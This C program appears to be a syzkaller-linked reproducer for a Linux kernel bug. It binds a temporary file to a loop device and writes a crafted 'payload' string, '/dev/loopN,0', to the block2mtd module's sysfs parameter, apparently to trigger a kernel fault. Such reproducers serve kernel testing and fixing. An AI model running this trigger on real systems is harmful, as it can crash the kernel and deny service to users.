// https://syzkaller.appspot.com/bug?id=c2a1d2a2c650be00c9d8f542a123baa3e833396b
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <linux/loop.h>
#include <errno.h>

int main(void)
{
	int ctl_fd = open("/dev/loop-control", O_RDWR);
	if (ctl_fd < 0) {
		printf("[-] Failed to open /dev/loop-control: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] Opened /dev/loop-control successfully.\n");
	
	int dev_nr = ioctl(ctl_fd, LOOP_CTL_GET_FREE);
	if (dev_nr < 0) {
		printf("[-] Failed to ioctl LOOP_CTL_GET_FREE: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] Got free loop device number: %d\n", dev_nr);

	char loop_name[64];
	snprintf(loop_name, sizeof(loop_name), "/dev/loop%d", dev_nr);

	int loop_fd = open(loop_name, O_RDWR);
	if (loop_fd < 0) {
		printf("[-] Failed to open loop device %s: %s\n", loop_name, strerror(errno));
		exit(1);
	}
	printf("[+] Opened loop device %s successfully.\n", loop_name);

	char template[] = "/tmp/dummyXXXXXX";
	int file_fd = mkstemp(template);
	if (file_fd < 0) {
		printf("[-] Failed to mkstemp: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] Created temporary file %s successfully.\n", template);

	if (ftruncate(file_fd, 1024 * 1024) < 0) {
		printf("[-] Failed to ftruncate: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] Truncated file successfully.\n");

	if (ioctl(loop_fd, LOOP_SET_FD, file_fd) < 0) {
		printf("[-] Failed to ioctl LOOP_SET_FD: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] Bound file to loop device successfully.\n");

	close(loop_fd);
	close(file_fd);

	int sys_fd = open("/sys/module/block2mtd/parameters/block2mtd", O_WRONLY);
	if (sys_fd < 0) {
		printf("[-] Failed to open block2mtd sysfs: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] Opened block2mtd sysfs successfully.\n");

	char payload[128];
	snprintf(payload, sizeof(payload), "%s,0", loop_name);
	
	printf("[+] Writing payload: %s\n", payload);
	ssize_t res = write(sys_fd, payload, strlen(payload));
	if (res < 0) {
		printf("[-] Failed to write payload: %s\n", strerror(errno));
	} else {
		printf("[+] Wrote payload successfully.\n");
	}

	close(sys_fd);
	close(ctl_fd);
	unlink(template);

	return 0;
}
